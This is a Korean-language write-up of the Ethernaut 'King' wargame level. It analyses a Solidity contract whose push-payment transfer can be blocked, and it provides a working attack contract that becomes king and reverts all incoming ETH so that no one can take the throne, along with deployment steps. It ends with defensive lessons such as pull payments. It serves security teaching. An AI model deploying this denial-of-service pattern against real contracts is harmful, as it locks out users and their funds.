# Ethernaut Level 9 - King

## 문제 설명

ETH를 전송해 왕이 된 후, 다른 사람이 왕이 될 수 없도록 막는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }
}
```

---

## 취약점 분석

### 1. transfer() 실패 시 revert

```solidity
king.transfer(msg.value);
```

현재 왕에게 ETH를 전송할 때, **왕이 컨트랙트이고 receive가 없거나 revert하면** 전체 트랜잭션이 revert된다.

→ 아무도 왕 자리를 빼앗지 못함

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable _king) payable {
        // 왕이 되기 위해 현재 prize 이상의 ETH를 전송
        (bool success,) = _king.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    // ETH 수신 시 revert → 왕위 탈환 불가
    receive() external payable {
        revert("I am the king forever");
    }
}
```

---

## 공격 단계

### Step 1 — 현재 prize 확인

```js
await contract.prize()
// → 예: 1000000000000000 (0.001 ETH)
```

### Step 2 — 공격 컨트랙트 배포

Remix에서 prize 이상의 ETH를 Value로 설정 후 배포:

```
_king  : King 인스턴스 주소
Value  : prize 이상 (예: 0.001 ETH)
```

MetaMask 승인

### Step 3 — 확인

이후 다른 주소에서 왕이 되려 시도하면 revert된다.

---

## 핵심 교훈

- `transfer()`와 `send()`는 수신 측에서 실패하면 전체 트랜잭션 revert
- 외부 컨트랙트에 ETH 전송 시 실패 처리를 항상 고려해야 함
- Pull Payment 패턴 사용 권장 (수신자가 직접 인출)
